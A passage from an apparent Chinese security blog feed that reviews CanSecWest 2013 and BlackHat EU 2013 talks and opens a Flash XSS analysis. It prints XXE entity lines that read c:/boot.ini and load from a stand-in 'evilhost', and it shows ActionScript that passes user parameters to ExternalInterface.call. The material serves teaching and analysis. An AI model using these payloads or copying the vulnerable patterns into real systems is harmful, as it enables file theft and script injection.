&lt;h3 id=&quot;7、《Cracking-and-Analyzing-Apple-iCloud-backups-Find-My-iPhone-Document-Storage》&quot;&gt;&lt;a href=&quot;#7、《Cracking-and-Analyzing-Apple-iCloud-backups-Find-My-iPhone-Document-Storage》&quot; class=&quot;headerlink&quot; title=&quot;7、《Cracking and Analyzing Apple iCloud backups, Find My iPhone, Document Storage》&quot;&gt;&lt;/a&gt;7、《Cracking and Analyzing Apple iCloud backups, Find My iPhone, Document Storage》&lt;/h3&gt;&lt;p&gt;基本就是在讲苹果的icloud服务及其原理，跟安全相关的内容不多，爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;8、《UPnP-Vulnerabilities》&quot;&gt;&lt;a href=&quot;#8、《UPnP-Vulnerabilities》&quot; class=&quot;headerlink&quot; title=&quot;8、《UPnP Vulnerabilities》&quot;&gt;&lt;/a&gt;8、《UPnP Vulnerabilities》&lt;/h3&gt;&lt;p&gt;PPT写得很是简单，内容也不是感兴趣，爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;9、《Analysis-of-a-Windows-Kernel-Vulnerability》&quot;&gt;&lt;a href=&quot;#9、《Analysis-of-a-Windows-Kernel-Vulnerability》&quot; class=&quot;headerlink&quot; title=&quot;9、《Analysis of a Windows Kernel Vulnerability》&quot;&gt;&lt;/a&gt;9、《Analysis of a Windows Kernel Vulnerability》&lt;/h3&gt;&lt;p&gt;共有273页，这是我见过最长的PPT文档。主要讲Duqu病毒所使用的 CVE-2011-3402：Windows win32k.sys TrueType 字体解析数组越界漏洞，从TTF字体格式开始分析，解释漏洞成因，以及漏洞的利用技术。在去年的syscan大会上，360的人也针对此漏洞分析过其原理及利用技术，可以交互参考阅读。国内最早分析并公开细节的应该是启明星辰，其在博客上也帖出了相应的分析文章，看雪和binvul论坛均有人发表相关的漏洞分析文章。&lt;/p&gt;
&lt;h3 id=&quot;10、《iOS-6-Exploitation-280-Days-Later》&quot;&gt;&lt;a href=&quot;#10、《iOS-6-Exploitation-280-Days-Later》&quot; class=&quot;headerlink&quot; title=&quot;10、《iOS 6 Exploitation 280 Days Later》&quot;&gt;&lt;/a&gt;10、《iOS 6 Exploitation 280 Days Later》&lt;/h3&gt;&lt;p&gt;作者之前搞了近10年的WEB安全，2010年中才开始搞iphone安全，但他98年就开始接触安全，也算是安全界的老一辈革命家了。讲了2012年之后出现过的一些ios漏洞，以及关于ios安全相关的资料和书籍，同时介绍苹果对此采取的一些保护机制（cookie、ASLR、程序目录权限限制……），大部分篇幅还是在介绍ios的保护机制。&lt;/p&gt;
&lt;h3 id=&quot;11、《Evil-Maid-Just-Got-Angrier：Why-Full-Disk-Encryption-With-TPM-is-Insecure-on-Many-Systems》&quot;&gt;&lt;a href=&quot;#11、《Evil-Maid-Just-Got-Angrier：Why-Full-Disk-Encryption-With-TPM-is-Insecure-on-Many-Systems》&quot; class=&quot;headerlink&quot; title=&quot;11、《Evil Maid Just Got Angrier：Why Full-Disk Encryption With TPM is Insecure on Many Systems》&quot;&gt;&lt;/a&gt;11、《Evil Maid Just Got Angrier：Why Full-Disk Encryption With TPM is Insecure on Many Systems》&lt;/h3&gt;&lt;p&gt;讲述关于bios那些底层的东东，看不懂，真心看不懂！&lt;/p&gt;
&lt;h3 id=&quot;12、《Physical-Privilege-Escalation-and-Mitigation-in-the-x86-World》&quot;&gt;&lt;a href=&quot;#12、《Physical-Privilege-Escalation-and-Mitigation-in-the-x86-World》&quot; class=&quot;headerlink&quot; title=&quot;12、《Physical Privilege Escalation and Mitigation in the x86 World》&quot;&gt;&lt;/a&gt;12、《Physical Privilege Escalation and Mitigation in the x86 World》&lt;/h3&gt;&lt;p&gt;硬件hacking一类的议题，PPT也大多是贴图，不好理解，反正是没看懂这PPT&lt;/p&gt;
&lt;h3 id=&quot;13、《Smart-TV-Security》&quot;&gt;&lt;a href=&quot;#13、《Smart-TV-Security》&quot; class=&quot;headerlink&quot; title=&quot;13、《Smart TV Security》&quot;&gt;&lt;/a&gt;13、《Smart TV Security》&lt;/h3&gt;&lt;p&gt;一个有趣的议题，主要讲关于智能电视安全，包括智能电视机上面的app漏洞，以及恶意app感染、网络通讯安全等问题，同时还介绍智能电视固件rootkit的开发，如何留取后门。控制智能电视后最大的风险就是用它来监控和窃听你的行为，因为智能电视都配有摄像头。最后，还介绍一些调试等逆向相关技术，以及操作电视的一些API函数。&lt;/p&gt;
&lt;h3 id=&quot;14、《The-Evolution-of-BlackHole》&quot;&gt;&lt;a href=&quot;#14、《The-Evolution-of-BlackHole》&quot; class=&quot;headerlink&quot; title=&quot;14、《The Evolution of BlackHole》&quot;&gt;&lt;/a&gt;14、《The Evolution of BlackHole》&lt;/h3&gt;&lt;p&gt;总觉得这是BlackHol exploit kit的广告帖，介绍BlackHole这一漏洞利用工具包的一些功能，一套售价冒似是1500美元，不过里面的一些功能看起来还是不错的。 &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;文档下载：&lt;a href=&quot;http://cansecwest.com/csw13archive.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://cansecwest.com/csw13archive.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="CanSecWest" scheme="http://riusksk.github.io/tags/CanSecWest/"/>
    
  </entry>
  
  <entry>
    <title>关于BlackHat EU 2013大会</title>
    <link href="http://riusksk.github.io/2013/03/20/BlackHat-EU-2013/"/>
    <id>http://riusksk.github.io/2013/03/20/BlackHat-EU-2013/</id>
    <published>2013-03-19T16:00:00.000Z</published>
    <updated>2016-06-24T14:24:54.000Z</updated>
    
    <content type="html">&lt;p&gt;大会文档下载：&lt;a href=&quot;https://www.blackhat.com/eu-13/archives.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.blackhat.com/eu-13/archives.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;此次BH EU 议题整体较水，涉及系统安全、移动安全、网络传输安全、WEB安全、游戏安全等。下面随便挑几个议题简单介绍下，有些议题不是很感兴趣，有些也特水，有兴趣的自己到上面链接下载文档。&lt;/p&gt;
&lt;h3 id=&quot;1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》&quot;&gt;&lt;a href=&quot;#1、《A-PERFECT-CRIME-ONLY-TIME-WILL-TELL》&quot; class=&quot;headerlink&quot; title=&quot;1、《A PERFECT CRIME? ONLY TIME WILL TELL》&quot;&gt;&lt;/a&gt;1、《A PERFECT CRIME? ONLY TIME WILL TELL》&lt;/h3&gt;&lt;p&gt;讲述SSL攻击方法——CRIME，如何从SSL加密的会话中获取到cookie，CRIME原理就是通过在受害者的浏览器中运行JavaScript代码并同时监听HTTPS传输数据，进而解密会话Cookie，也算是中间人攻击MIMT的一种方法。该议题对&lt;code&gt;CRIME&lt;/code&gt;方法进行扩展，介绍一种叫&lt;code&gt;TIME (Timing Info-leak MadeEasy)&lt;/code&gt;的攻击手法，基于传输时间来猜测payload size，然后逐字猜解cookie。&lt;/p&gt;
&lt;h3 id=&quot;2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》&quot;&gt;&lt;a href=&quot;#2、《ADVANCED-HEAP-MANIPULATION-IN-WINDOWS-8》&quot; class=&quot;headerlink&quot; title=&quot;2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》&quot;&gt;&lt;/a&gt;2、《ADVANCED HEAP MANIPULATION IN WINDOWS 8》&lt;/h3&gt;&lt;p&gt;介绍常堆及内核溢出利用技巧，以及在win8上改进后的内存安全保护机制。里面构造堆内存布局的exploit技巧，与以往利用信息泄露获取dll基址来绕过ASLR方法有些类似，都通过分配特定大小的堆块，然后释放出与造成溢出的堆块大小相同的堆块，触发漏洞后覆盖到特定结构。同时，介绍了内核中的堆块分配与释放的原理，然后讲述不同大小的堆块溢出后，如何构造相应的堆布局来实现利用。最后，以windows object内核漏洞为例，讲述win7\win8上的exploit技巧，在wihte paper中已给出相应的exploit代码。&lt;/p&gt;
&lt;h3 id=&quot;3、《THE-DEPUTIES-ARE-STILL-CONFUSED》&quot;&gt;&lt;a href=&quot;#3、《THE-DEPUTIES-ARE-STILL-CONFUSED》&quot; class=&quot;headerlink&quot; title=&quot;3、《THE DEPUTIES ARE STILL CONFUSED》&quot;&gt;&lt;/a&gt;3、《THE DEPUTIES ARE STILL CONFUSED》&lt;/h3&gt;&lt;p&gt;总之，这议题很水，爱看不看。主要讲CSRF和点击劫持&lt;code&gt;clickjacking&lt;/code&gt;的攻击技巧，里面也提到前段时间facebook爆出的OAuth2认证漏洞，点击劫持就讲下beef的&lt;code&gt;clickjacking&lt;/code&gt;模块，然后提下防御点击劫持的&lt;code&gt;x-frame-options&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;4、《Hacking-Appliances-Ironic-exploits-in-security-products》&quot;&gt;&lt;a href=&quot;#4、《Hacking-Appliances-Ironic-exploits-in-security-products》&quot; class=&quot;headerlink&quot; title=&quot;4、《Hacking Appliances: Ironic exploits in security products》&quot;&gt;&lt;/a&gt;4、《Hacking Appliances: Ironic exploits in security products》&lt;/h3&gt;&lt;p&gt;初看这标题，还以为是讲客户端软件漏洞利用呢，其实主要还是讲WEB安全的多一些，觉得有点水。&lt;/p&gt;
&lt;h3 id=&quot;5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》&quot;&gt;&lt;a href=&quot;#5、《HACKING-VIDEO-CONFERENCING-SYSTEMS》&quot; class=&quot;headerlink&quot; title=&quot;5、《HACKING VIDEO CONFERENCING SYSTEMS》&quot;&gt;&lt;/a&gt;5、《HACKING VIDEO CONFERENCING SYSTEMS》&lt;/h3&gt;&lt;p&gt;比较有趣的一个议题，主要讲述如何攻击语音会议系统，介绍了root提权以及远程调试的一些技巧，最后演示了一个后门shell。对这些不是很了解，有兴趣的自己看文档。&lt;/p&gt;
&lt;h3 id=&quot;6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》&quot;&gt;&lt;a href=&quot;#6、《Hardening-your-Windows-8-apps-for-the-Windows-Store》&quot; class=&quot;headerlink&quot; title=&quot;6、《Hardening your Windows 8 apps for the Windows Store》&quot;&gt;&lt;/a&gt;6、《Hardening your Windows 8 apps for the Windows Store》&lt;/h3&gt;&lt;p&gt;很水，不解释&lt;/p&gt;
&lt;h3 id=&quot;7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》&quot;&gt;&lt;a href=&quot;#7、《Harnessing-GP²Us-Building-Better-Browser-Based-Botnets》&quot; class=&quot;headerlink&quot; title=&quot;7、《Harnessing GP²Us Building Better Browser Based Botnets》&quot;&gt;&lt;/a&gt;7、《Harnessing GP²Us Building Better Browser Based Botnets》&lt;/h3&gt;&lt;p&gt;觉得这议题有点在玩概念，实际攻击场景或者实战的东西很少，太理论化了。GPU现在很多被用在暴力破解方面，比如跑MD5、跑WPA-PSK，速度比CPU快得N多，比五速鞋还五速鞋……该议题主要讲构造基于浏览器的僵尸网络botnet，利用WEB漏洞（如XSS，并提到利用html5的WEB存储特性、插件等等方法实现永久XSS）来执行代码，再用GPU跑数据，然后利用C&amp;amp;C服务器进行通讯。&lt;/p&gt;
&lt;h3 id=&quot;8、《LET’S-PLAY-APPLANTING》&quot;&gt;&lt;a href=&quot;#8、《LET’S-PLAY-APPLANTING》&quot; class=&quot;headerlink&quot; title=&quot;8、《LET’S PLAY - APPLANTING》&quot;&gt;&lt;/a&gt;8、《LET’S PLAY - APPLANTING》&lt;/h3&gt;&lt;p&gt;很水，为什么这种也能上BH大会讲呢&lt;/p&gt;
&lt;h3 id=&quot;9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》&quot;&gt;&lt;a href=&quot;#9、《MULTIPLAYER-ONLINE-GAMES-INSECURITY》&quot; class=&quot;headerlink&quot; title=&quot;9、《MULTIPLAYER ONLINE GAMES INSECURITY》&quot;&gt;&lt;/a&gt;9、《MULTIPLAYER ONLINE GAMES INSECURITY》&lt;/h3&gt;&lt;p&gt;讲游戏漏洞相关的，主要涉及协议分析、常见客户端漏洞攻击等，没什么新鲜的东西，爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;10、《Next-generation-mobile-rootkits》&quot;&gt;&lt;a href=&quot;#10、《Next-generation-mobile-rootkits》&quot; class=&quot;headerlink&quot; title=&quot;10、《Next generation mobile rootkits》&quot;&gt;&lt;/a&gt;10、《Next generation mobile rootkits》&lt;/h3&gt;&lt;p&gt;相对比较前沿的东西，主要讲arm平台上的rookit设计，但PPT写得太简洁了，简单一些文本描述，很难完全理解其中意思。之前viaForensics也写一篇关于android rootkit的文档《Dude,where’s my droid?!》，发表于RootedCON 2013安全大会，推荐阅读。&lt;/p&gt;
&lt;h3 id=&quot;11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》&quot;&gt;&lt;a href=&quot;#11、《POWER-ANALYSIS-ATTACKS-FOR-CHEAPSKATES》&quot; class=&quot;headerlink&quot; title=&quot;11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》&quot;&gt;&lt;/a&gt;11、《POWER ANALYSIS ATTACKS FOR CHEAPSKATES》&lt;/h3&gt;&lt;p&gt;可能一些搞硬件hacking或者移动安全的朋友会感兴趣，应该属于边信道攻击一类，玩这种都需要花钱买设备，所以搞这些的一般都是高富帅，像kevin2600一样。&lt;/p&gt;
&lt;h3 id=&quot;12、《XML-Out-Of-Band-Data-Retrieval》&quot;&gt;&lt;a href=&quot;#12、《XML-Out-Of-Band-Data-Retrieval》&quot; class=&quot;headerlink&quot; title=&quot;12、《XML Out-Of-Band Data Retrieval》&quot;&gt;&lt;/a&gt;12、《XML Out-Of-Band Data Retrieval》&lt;/h3&gt;&lt;p&gt;这种XML实体注入漏洞，在2011年的时候，80sec就有写过一篇文章提到《XML实体注入漏洞安全警告》&lt;a href=&quot;http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.80sec.com/xml-entity-injection.html，比如可用于读取文件，加载远程页面：&lt;/a&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!ENTITY % payload SYSTEM &amp;quot;file:///c:/boot.ini&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;!ENTITY % remote SYSTEM &amp;quot;http://evilhost/evil.xml&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;漏洞实例见《zend framework文件读取漏洞分析》：&lt;a href=&quot;http://zone.wooyun.org/content/508&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://zone.wooyun.org/content/508&lt;/a&gt; ，不过最早是在2002年的时候老外就有提出过这个问题。&lt;/p&gt;
&lt;h3 id=&quot;13、《Advanced-iOS-Application-Pentesting》&quot;&gt;&lt;a href=&quot;#13、《Advanced-iOS-Application-Pentesting》&quot; class=&quot;headerlink&quot; title=&quot;13、《Advanced iOS Application Pentesting》&quot;&gt;&lt;/a&gt;13、《Advanced iOS Application Pentesting》&lt;/h3&gt;&lt;p&gt;看标题冒似很“高级”的样子，实则就介绍下ios的一些逆向工具和ios编程中用到的一些类而已，还是爱看不看。&lt;/p&gt;
&lt;h3 id=&quot;14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》&quot;&gt;&lt;a href=&quot;#14、《APPLICATION-DEVELOPMENT-SECURE-CODING-WORKSHOP》&quot; class=&quot;headerlink&quot; title=&quot;14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》&quot;&gt;&lt;/a&gt;14、《APPLICATION DEVELOPMENT SECURE CODING WORKSHOP》&lt;/h3&gt;&lt;p&gt;主要讲WEB开发中安全编程，但主要就是在普及WEB安全漏洞的原理、防御等，包括XSS、注入、CSRF等等，算是总结性文章，没有新货，有兴趣的自个翻看下。&lt;/p&gt;
&lt;h3 id=&quot;15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》&quot;&gt;&lt;a href=&quot;#15、《Assessing-BYOD-with-the-Smarthpone-Pentest-Framework》&quot; class=&quot;headerlink&quot; title=&quot;15、《Assessing BYOD with the Smarthpone Pentest Framework》&quot;&gt;&lt;/a&gt;15、《Assessing BYOD with the Smarthpone Pentest Framework》&lt;/h3&gt;&lt;p&gt;作者公布了一款智能机渗透测试框架——Smartphone Pentest Framework v0.1.5，包括一些浏览器漏洞、客户端漏洞、社会工程学漏洞以及本地提权等，利用漏洞获取shell后还可发送短信、获取通信录、短信、下载上传文件等，有些功能还是不错的，但漏洞利用方法相对单一，有其利用的局限性。该工具下载地址：&lt;br&gt;&lt;a href=&quot;https://github.com/georgiaw/Smartphone-Pentest-Framework&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/georgiaw/Smartphone-Pentest-Framework&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;大会文档下载：&lt;a href=&quot;https://www.blackhat.com/eu-13/archives.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.blackhat.com/eu-13/archives.html
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="BlackHat" scheme="http://riusksk.github.io/tags/BlackHat/"/>
    
  </entry>
  
  <entry>
    <title>若干flash xss漏洞分析</title>
    <link href="http://riusksk.github.io/2013/03/07/%E8%8B%A5%E5%B9%B2flash-xss%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://riusksk.github.io/2013/03/07/若干flash-xss漏洞分析/</id>
    <published>2013-03-06T16:00:00.000Z</published>
    <updated>2016-06-26T02:32:12.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;漏洞一&quot;&gt;&lt;a href=&quot;#漏洞一&quot; class=&quot;headerlink&quot; title=&quot;漏洞一&quot;&gt;&lt;/a&gt;漏洞一&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;Parameters.getInstance().data = loaderInfo.parameters;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;onPlayStart&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:String&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (_data[&lt;span class=&quot;string&quot;&gt;&quot;onPlayStart&quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExternalInterface.call(Parameters.getInstance().onPlayStart, _arg1);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExternalInterface.call(Parameters.getInstance().onPlayStop);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ExternalInterface.call(Parameters.getInstance().onFileLoadedError);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞二&quot;&gt;&lt;a href=&quot;#漏洞二&quot; class=&quot;headerlink&quot; title=&quot;漏洞二&quot;&gt;&lt;/a&gt;漏洞二&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;reload&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(u, show_loading)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (show_loading == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        show_loading = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (show_loading) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        _root.loading = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Loading(&lt;span class=&quot;string&quot;&gt;&quot;Loading data...&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; _local2 = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (_root.data != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        _local2 = _root.data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (u != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (u.length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            _local2 = u;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv = &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; LoadVars();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.onLoad = LoadVarsOnLoad;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.make_chart = make_chart;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.make_pie = make_pie;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    _root.lv.load(_local2);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;漏洞三&quot;&gt;&lt;a href=&quot;#漏洞三&quot; class=&quot;headerlink&quot; title=&quot;漏洞三&quot;&gt;&lt;/a&gt;漏洞三&lt;/h3&gt;&lt;figure class=&quot;highlight as&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; csPreloader;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;loader.loadClip(csPreloader, preloader_mc.target);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
